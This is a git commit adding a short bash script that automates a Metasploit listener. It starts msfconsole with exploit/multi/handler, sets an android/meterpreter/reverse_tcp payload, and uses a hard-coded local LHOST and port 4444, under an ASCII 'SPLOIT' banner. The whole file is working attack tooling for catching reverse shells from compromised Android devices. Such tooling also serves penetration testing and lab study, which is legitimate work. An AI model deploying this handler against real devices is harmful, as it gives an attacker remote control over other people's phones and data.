256b1d88499988118acadd7500b6dfee551dd006
Breezy <114720008+breezy-codes@users.noreply.github.com>
2024-09-12 13:47:13 +1000

    Updates to Python Scripts

---
+++ Python-Scripts/MSF-Console-Setup/setup.sh
@@ -0,0 +1,28 @@
+#!/bin/bash
+
+# Set the LHOST and LPORT as variables
+PAYLOAD="android/meterpreter/reverse_tcp"
+LHOST="192.168.1.124"
+LPORT="4444"
+
+echo "
+███████╗██████╗ ██╗      ██████╗ ██╗████████╗
+██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
+███████╗██████╔╝██║     ██║   ██║██║   ██║   
+╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
+███████║██║     ███████╗╚██████╔╝██║   ██║   
+╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
+Loading Metasploit and Setting up the Handler
+Using PAYLOAD: $PAYLOAD
+Using LHOST: $LHOST
+Using LPORT: $LPORT
+"
+
+# Start msfconsole and automate the setup
+msfconsole -q -x "
+use exploit/multi/handler;
+set payload $PAYLOAD;
+set LHOST $LHOST;
+set LPORT $LPORT;
+run -j;
+"
